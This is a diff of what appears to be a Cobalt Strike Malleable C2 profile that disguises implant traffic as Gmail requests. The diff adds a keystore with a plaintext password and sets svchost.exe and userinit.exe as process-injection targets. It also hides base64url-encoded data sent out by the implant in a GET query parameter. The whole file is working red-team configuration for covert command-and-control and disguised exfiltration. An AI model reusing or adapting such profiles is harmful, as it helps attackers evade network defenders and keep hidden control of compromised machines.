@@ -3,18 +3,14 @@
 # Author: @ChrisTruncer
 
 https-certificate {
-	set CN       "gmail.com";
-	set O        "Google GMail";
-	set C        "US";
-	set L        "Mountain View";
-	set OU       "Google Mail";
-	set ST       "CA";
-	set validity "365";
+	set keystore "interactivebrowsing.store";
+	set password "TeamRageQuit";
 }
 
 set sleeptime "60000";
 set pipename "interprocess_##";
-set spawnto "userinit.exe";
+set spawnto_x86 "%windir%\\syswow64\\svchost.exe";
+set spawnto_x64 "%windir%\\sysnative\\userinit.exe";
 set jitter "15";
 set dns_idle "8.8.4.4";
 
@@ -66,11 +62,10 @@ http-get {
 
 http-post {
 	set uri "/mail/u/0/";
+	set verb "GET";
 	client {
-		parameter "ui" "d3244c4707";
 		parameter "hop" "6928632";
 		parameter "start" "0";
-		header "Content-Type" "application/x-www-form-urlencoded;charset=utf-8";
 
 		id {
 			base64;
@@ -79,8 +74,8 @@ http-post {
         }
 
 		output{
-			base64;
-			print;
+			base64url;
+			parameter "ui";
 		}
 	}
 
